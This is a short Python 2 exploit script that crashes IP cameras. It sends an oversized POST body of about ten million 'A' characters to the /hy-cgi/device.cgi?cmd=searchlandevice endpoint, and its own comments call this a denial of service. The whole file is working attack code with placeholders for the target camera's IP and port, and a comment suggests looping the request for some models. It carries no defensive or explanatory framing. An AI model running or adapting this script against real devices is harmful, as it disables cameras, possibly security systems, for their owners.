import string
import httplib
import urllib2

host = "<YOUR_CAMERA_IP>"

#Huge body causes Denial of Service
params='A'*9999999

headers = { "Host": "<YOUR_CAMERA_IP>:<PORT>",
"Connection": "keep-alive",
"Content-Length": 9999999,
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
"Content-Type": "application/json",
"Accept": "*/*",
"Accept-Encoding": "gzip,deflate,sdch",
"Accept-Language": "fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4",
"Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.3",
}

url = "/hy-cgi/device.cgi?cmd=searchlandevice"

# Some models needs a while loop
# POST the request
conn = httplib.HTTPConnection(host,port=<YOUR_CAMERA_PORT>)
conn.request("POST",url,params,headers)
response = conn.getresponse()

data = response.read()
print data
